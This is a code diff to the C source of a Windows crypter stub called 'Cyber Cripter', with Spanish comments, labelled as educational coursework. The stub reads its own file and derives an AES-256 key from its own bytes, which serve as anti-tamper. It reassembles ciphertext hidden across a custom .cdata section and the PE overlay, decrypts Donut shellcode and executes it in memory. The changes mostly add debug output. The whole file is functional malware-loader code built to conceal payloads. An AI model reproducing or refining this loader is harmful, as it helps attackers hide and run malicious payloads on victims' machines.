@@ -1,3 +1,29 @@
+/*
+ * Cyber Cripter — testing stub (educational coursework).
+ *
+ * Este binario es la plantilla pre-compilada del loader que el builder C# parchea.
+ * El layout en disco, tras el parcheo, es:
+ *
+ *   Sección .cdata (datos const inicializados, mapeados solo-lectura en runtime):
+ *     g_meta        — StubMetadata (heap_marker, timestamp, IV, tamaños,
+ *                      hash_region_size). Localizado via METADATA_MAGIC.
+ *     g_half1_buf   — buffer prefijado con magic que contiene la primera mitad
+ *                      del ciphertext. Localizado via HALF1_MAGIC. Capacidad HALF1_MAX bytes.
+ *
+ *   PE overlay (bytes en bruto tras la última sección del PE):
+ *     segunda mitad del ciphertext — half2 (tamaño en g_meta.half2_size).
+ *
+ * Flujo en runtime:
+ *   1. Leer el propio fichero desde disco.
+ *   2. Re-derivar la clave AES-256:
+ *         clave = SHA256( heap_marker || self_bytes[0..hash_region] || timestamp )
+ *      Los bytes del stub en el hash actúan como anti-tamper: cualquier modificación
+ *      del prefijo hasheado invalida la clave y el descifrado falla.
+ *   3. Remontar el ciphertext completo = half1 || half2.
+ *   4. Descifrar con AES-256-CBC con padding PKCS#7 -> shellcode (salida de Donut).
+ *   5. Ejecutar payload en memoria.
+ */
+
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
@@ -12,10 +38,10 @@
 
 /* Capacidad máxima del buffer embebido en .cdata para la primera mitad del ciphertext (1 MiB).
    Debe coincidir con HALF1_MAX en StubBuilder.cs del builder C#. */
-#define HALF1_MAX 0x100000
+#define HALF1_MAX 0x7D000
 
 /* Layout de los metadatos que el builder escribe en .cdata.
-   Idéntico al de stub_EarlyBirdAPC.c — el builder C# es agnóstico al tipo de stub. */
+   Idéntico al de stub_EarlyBirdAPC.c . */
 #pragma pack(push, 1)
 typedef struct {
     unsigned char      magic[16];
@@ -30,6 +56,7 @@ typedef struct {
 
 #pragma section(".cdata", read)
 
+// Se crea StubMetadata dentro de .cdata
 __declspec(allocate(".cdata"))
 volatile const StubMetadata g_meta = {
     /* magic            */ { 'M','E','T','A','!','C','R','Y','p','T','e','R','!',
@@ -42,6 +69,7 @@ volatile const StubMetadata g_meta = {
     /* hash_region_size */ 0
 };
 
+// Se crea buffer de datos dentro de .cdata de (16 + HALF1_MAX) Bytes
 __declspec(allocate(".cdata"))
 volatile const unsigned char g_half1_buf[16 + HALF1_MAX] = {
     'H','A','L','F','!','O','N','E','!','D','A','T','A', 0xDD, 0xEE, 0xFF
@@ -69,10 +97,10 @@ static void  xfree(void *p)   { if (p) HeapFree(GetProcessHeap(), 0, p); }
  * @param[in]  src  Buffer de origen.
  * @param[in]  n    Número de bytes a copiar.
  */
-static void xcopy(void *dst, const void *src, SIZE_T n)
+static void xcopy(void *dst, const volatile void *src, SIZE_T n)
 {
     unsigned char *d = (unsigned char *)dst;
-    const unsigned char *s = (const unsigned char *)src;
+    const volatile unsigned char *s = (const volatile unsigned char *)src;
     while (n--) *d++ = *s++;
 }
 
@@ -206,21 +234,31 @@ end:
 /* Ejecuta shellcode directamente en el proceso actual */
 static int execute_shellcode(const unsigned char *sc, SIZE_T sc_len) {
     LPVOID mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
-    if (!mem) return 0;
+    if (!mem) {
+        printf("[-] Error: VirtualAlloc failed. GetLastError() = %lu\n", GetLastError());
+        return 0;
+    }
 
     if (!WriteProcessMemory(GetCurrentProcess(), mem, sc, sc_len, NULL)) {
+        printf("[-] Error: WriteProcessMemory failed. GetLastError() = %lu\n", GetLastError());
         VirtualFree(mem, 0, MEM_RELEASE);
         return 0;
     }
 
+    printf("[+] Shellcode copiado correctamente.\n");
+
     // Ejecutar el shellcode
     typedef void (*shellcode_func)();
     shellcode_func func = (shellcode_func)mem;
+    printf("[+] About to execute shellcode at %p\n", func);
     func();
+    printf("[+] Shellcode returned successfully.\n");
 
     // Limpiar
+    printf("[+] Zeroing allocated memory...\n");
     xzero(mem, sc_len);
     VirtualFree(mem, 0, MEM_RELEASE);
+    printf("[+] execute_shellcode() completed successfully.\n");
     return 1;
 }
 
@@ -244,9 +282,10 @@ static void init_console(void)
 int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;
 
+    // UNCOMMENT THIS LINE FOR DEBUGGING
     init_console();
-    printf("[+] Stub iniciado.\n");
 
+    printf("[+] Stub iniciado.\n");
 
     /* Paso 1: leer el propio binario desde disco */
     unsigned char *self = NULL;
@@ -271,7 +310,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     printf("[+] 1. Binario leido desde el disco.\n");
 
     /* Paso 2: derivar la clave AES = SHA256(heap_marker || self[0..hr] || timestamp) */
-    DWORD hin_len = 8 + hr + 8;
+        DWORD hin_len = 8 + hr + 8;
     unsigned char *hin = (unsigned char *)xalloc(hin_len);
     if (!hin) { 
         printf("[-] Error: No se pudo asignar memoria para hin.\n");
@@ -279,9 +318,58 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         return 3; 
     }
 
-    xcopy(hin,            (const void *)g_meta.heap_marker, 8);
+    xcopy(hin,            g_meta.heap_marker, 8);
     xcopy(hin + 8,        self, hr);
-    xcopy(hin + 8 + hr,   (const void *)&g_meta.timestamp, 8);
+    xcopy(hin + 8 + hr,   (const volatile unsigned char *)&g_meta.timestamp, 8);
+        // const volatile unsigned char *p =
+        //     (const volatile unsigned char *)&g_meta.timestamp;
+
+        // printf("[+] timestamp bytes:\n");
+        // for (int i = 0; i < 8; i++)
+        //     printf("%02X ", p[i]);
+        // printf("\n");
+
+        // xcopy(hin,            p, 8);
+
+
+    // DEBUG: Mostrar valores input clave
+        /* Mostrar heap_marker */
+        printf("[+] Heap marker: ");
+        for (int i = 0; i < 8; i++)
+            printf("%02X", g_meta.heap_marker[i]);
+        printf("\n");
+
+        /* Mostrar timestamp */
+        printf("[+] Timestamp: %llu (0x%016llX)\n",
+            g_meta.timestamp,
+            g_meta.timestamp);
+
+        
+
+        /* Mostrar hash de los primeros hr bytes de self */
+        unsigned char hash[32];
+        cng_sha256(self, hr, hash);
+        printf("[+] SHA-256(self): ");
+        for (int i = 0; i < 32; i++)
+            printf("%02X", hash[i]);
+        printf("\n");
+
+        /* DEBUG: Mostrar contenido de hin */
+
+        printf("[+] hin (%u bytes):\n", hin_len);
+        for (DWORD i = 0; i < hin_len; i++) {
+            printf("%02X", hin[i]);
+
+            /* Espacio cada 16 bytes para mejorar la legibilidad */
+            if ((i + 1) % 16 == 0)
+                printf("\n");
+            else
+                printf(" ");
+        }
+
+        if (hin_len % 16 != 0)
+            printf("\n");
+
 
     unsigned char key[32];
     int ok = cng_sha256(hin, hin_len, key);
@@ -293,7 +381,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     }
 
     printf("[+] 2. Clave leida desde el disco: \n");
-    for (int i = 0; i < 32; i++) printf("%02x", key[i]);
+    for (int i = 0; i < 32; i++) printf("%02X", key[i]);
     printf("\n");
 
     /* Paso 3: remontar el ciphertext completo = half1 (en .cdata) || half2 (overlay) */
@@ -305,14 +393,15 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         xfree(self); 
         return 5; 
     }
-    xcopy(ct,        (const void *)(g_half1_buf + 16), h1);
+    xcopy(ct,        g_half1_buf + 16, h1);
     xcopy(ct + h1,   self + (self_size - h2), h2);
     xfree(self);
-
-    unsigned char iv[16];
-    xcopy(iv, (const void *)g_meta.iv, 16);
+    printf("[+] 3. Ciphertext reconstruido.\n");
 
     /* Paso 4: descifrar AES-256-CBC -> shellcode Donut */
+    unsigned char iv[16];
+    xcopy(iv, g_meta.iv, 16);
+
     unsigned char *sc = NULL;
     DWORD sc_len = 0;
     ok = cng_aes256cbc_decrypt(key, iv, ct, ct_len, &sc, &sc_len);
@@ -322,6 +411,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         return 6;
     }
 
+    printf("[+] 4. Descifrado del código completado.\n");
+
 
     // Ejecutar el shellcode
     if (!execute_shellcode(sc, sc_len)) {
@@ -329,6 +420,8 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
         //MessageBoxA(NULL, "Error ejecutando shellcode", "Error", MB_ICONERROR);
         return 7;
     }
+
+    printf("[+] 5. Ejecución de código completada.\n");
 
     return 0;
 }
